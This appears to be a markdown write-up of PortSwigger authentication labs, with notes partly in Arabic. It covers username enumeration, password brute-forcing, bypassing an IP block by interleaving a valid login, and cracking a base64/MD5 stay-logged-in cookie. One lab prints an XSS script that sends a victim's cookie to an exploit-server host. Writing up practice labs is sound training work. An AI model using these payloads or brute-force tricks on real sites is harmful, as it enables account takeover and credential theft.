# Authentication vulnerabilities



<details>
  <summary>Lab: Username enumeration via different responses</summary>

> ### try invalid usernaem ``admin``

<img width="1030" height="436" alt="image" src="https://github.com/user-attachments/assets/ae7dc0ef-29c0-4040-95a1-7011a3012721" />

> ### try to bruteforce username and match ``Invalid username``

<img width="1604" height="553" alt="image" src="https://github.com/user-attachments/assets/25abcbc9-5139-4067-b66f-27aa66b63cb8" />

<img width="1277" height="469" alt="image" src="https://github.com/user-attachments/assets/2d856d21-4f13-420d-a978-5b3fd040ab66" />

### so now username is 

```
user
```

---

> ### now bruteforce the password:

<img width="1016" height="358" alt="image" src="https://github.com/user-attachments/assets/65292c04-6634-4f0a-befa-d58f1a5474c4" />

so passowrd is :

```
iloveyou
```

<img width="1341" height="617" alt="image" src="https://github.com/user-attachments/assets/77519529-471c-40f0-9f0a-7c447c705326" />





  
</details>






<details>
  <summary>Lab: 2FA simple bypass</summary>


<img width="1105" height="319" alt="image" src="https://github.com/user-attachments/assets/7fbed2c2-8e4d-4fd5-bbc8-7d820821a746" />


  
</details>




<details>
  <summary>Lab: Password reset broken logic</summary>


- > click reset password and check email box you will found link click on it if you try to remove token error will apper
  >
  > write new password and intercept the request now you can remove token and change user to carlos 



  
</details>





<details>
  <summary>Lab: Username enumeration via subtly different responses</summary>

```
✅ 4.Username enumeration via subtly different responses
الثغرة: التطبيق بيرجع رسائل خطأ مختلفة بشكل طفيف جدًا حسب إذا كان اليوزر موجود أو مش موجود.
مثلًا:

Invalid username or password. ← لو اليوزر مش موجود.

Invalid password or password ← لو اليوزر موجود.

الرسالة شكلها شبه بعض لكن فيها فرق بسيط جدًا، والمهاجم ممكن يلاحظه.
```



  
</details>







<details>
  <summary>Lab: Username enumeration via response timing</summary>

```
✅ 5. Username enumeration via response timing
الثغرة: الاختلاف في زمن الاستجابة لما يكون اليوزر موجود.

الاستغلال: لو زمن الاستجابة أطول مع يوزر معين → غالبًا موجود (لأن الباسورد بيتشيك بعده).


```

  
</details>






<details>
  <summary>Lab: Broken brute-force protection, IP block</summary>


```
افتح Burp Suite واعمل Proxy للـ login page.

جرب تدخل بيانات غلط 3 مرات وراء بعض:

لاحظ إن بعد 3 محاولات فاشلة بيظهر block للـ IP (مثلاً رسالة error أو delay).

جرب بعد محاولتين فاشلتين تعمل login ناجح بحسابك (wiener:peter):

هتلاحظ إن العداد بيرجع للصفر وتقدر تكمل المحاولات بدون block.
```

### ``usernames``

```
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
```

### ``passwords``

```
peter
123456
peter
password
peter
12345678
peter
qwerty
peter
123456789
peter
12345
peter
1234
peter
111111
peter
1234567
peter
dragon
peter
123123
peter
baseball
peter
abc123
peter
football
peter
monkey
peter
letmein
peter
shadow
peter
master
peter
666666
peter
qwertyuiop
peter
123321
peter
mustang
peter
1234567890
peter
michael
peter
654321
peter
superman
peter
1qaz2wsx
peter
7777777
peter
121212
peter
000000
peter
qazwsx
peter
123qwe
peter
killer
peter
trustno1
peter
jordan
peter
jennifer
peter
zxcvbnm
peter
asdfgh
peter
hunter
peter
buster
peter
soccer
peter
harley
peter
batman
peter
andrew
peter
tigger
peter
sunshine
peter
iloveyou
peter
2000
peter
charlie
peter
robert
peter
thomas
peter
hockey
peter
ranger
peter
daniel
peter
starwars
peter
klaster
peter
112233
peter
george
peter
computer
peter
michelle
peter
jessica
peter
pepper
peter
1111
peter
zxcvbn
peter
555555
peter
11111111
peter
131313
peter
freedom
peter
777777
peter
pass
peter
maggie
peter
159753
peter
aaaaaa
peter
ginger
peter
princess
peter
joshua
peter
cheese
peter
amanda
peter
summer
peter
love
peter
ashley
peter
nicole
peter
chelsea
peter
biteme
peter
matthew
peter
access
peter
yankees
peter
987654321
peter
dallas
peter
austin
peter
thunder
peter
taylor
peter
matrix
peter
mobilemail
peter
mom
peter
monitor
peter
monitoring
peter
montana
peter
moon
peter
moscow

```



<img width="1676" height="794" alt="image" src="https://github.com/user-attachments/assets/9922e3be-dddc-49af-a0f1-7e6fb80bf588" />


```
carlos : daniel
```

<img width="1313" height="602" alt="image" src="https://github.com/user-attachments/assets/6ef4ebcb-564a-410c-ab9a-39c3a6ce3213" />





  
</details>








<details>
   <summary>Lab: Brute-forcing a stay-logged-in cookie</summary>


### 🎱``8 Lab: Brute-forcing a stay-logged-in cookie``

- > first login with ``wiener:peter`` with stay logged in option and inturcept the request
  >
  > ``found``
  >
  > <img width="1167" height="424" alt="image" src="https://github.com/user-attachments/assets/098dcadc-95fb-436c-ae1d-fde1290cc3a4" />
  >
  > ```
  > Cookie: session=X2AecSWQYF3pEDwqbjSuG6FYLHSV6IGq; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
  > ```
  >
  > as you see ``stay-logged-in`` is decoded in **``base64``** when decode it found:
  >
  > ```
  > wiener:51dc30ddc473d43a6011e9ebba6ca770
  > ```
  >
  > ``structure of cookies``
  >
  > ```
  > base64(username:MD5(password))
  > ```
  >
  > ohh so this cookie have username and passowrd hashed in ``MD5`` after decrypt it found the password **``peter``**
  >
  > **``order is important``**
  >
  > <img width="1878" height="742" alt="image" src="https://github.com/user-attachments/assets/9f556feb-f647-4080-af43-767f6e5d969c" />
  > 
  > ![image](https://github.com/user-attachments/assets/d8ed9b02-4be1-4c3d-b40b-d4e1d4d1b8d9)
  >
  > 
  > 


   
  
</details>



















<details>
  <summary>Lab: Offline password cracking</summary>


### 9 offline password cracking 

- > first login with my username and passowrd ``wiener:peter`` with stay login button 
  >
  > found in cookie that is encoded in base64
  >
  > ``base64(username:md5(password))``
  >
  > now we know that comments is vuln to xss you will steal cookie of ``carlos`` by using xss
  >
  > in comment put
  >
  > ```
  > <script>document.location='https://exploit-0a1f000d0421311d80d80c4801090020.exploit-server.net/exploit'+document.cookie</script>
  > ```
  >
  > after that go to exploit server then logs you will find cookies of carlos
  >
  > ``Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz``
  >
  > ``carlos:26323c16d5f4dabff3bb136f2460a943``
  >
  > ``carlos:onceuponatime``

  
</details>
















<details>
  <summary>Lab: Password reset poisoning via middleware</summary>


1. login with ``wiener:peter``
2. signout
3. login with ``carlos``
4. click forget passowrd

  
</details>

































<details>
  <summary>Lab: Username enumeration via account lock</summary>

<img width="1480" height="804" alt="image" src="https://github.com/user-attachments/assets/558b88cf-ae67-439c-9ca5-caac98a2280e" />

```
carlos
carlos
carlos
carlos
carlos
root
root
root
root
root
admin
admin
admin
admin
admin
....
....

```

> ### SO USERNAME IS **`acceso`**


<img width="1543" height="738" alt="image" src="https://github.com/user-attachments/assets/2c27e85f-9d3b-4c07-b3b6-18f92347f884" />

> ### SO PASSWORD IS **`letmein`**

```
acceso : letmein
```

<img width="1779" height="845" alt="image" src="https://github.com/user-attachments/assets/e7e2dd78-6f7b-41bd-a779-ade23d51a0a8" />


  
</details>






























----- 
















































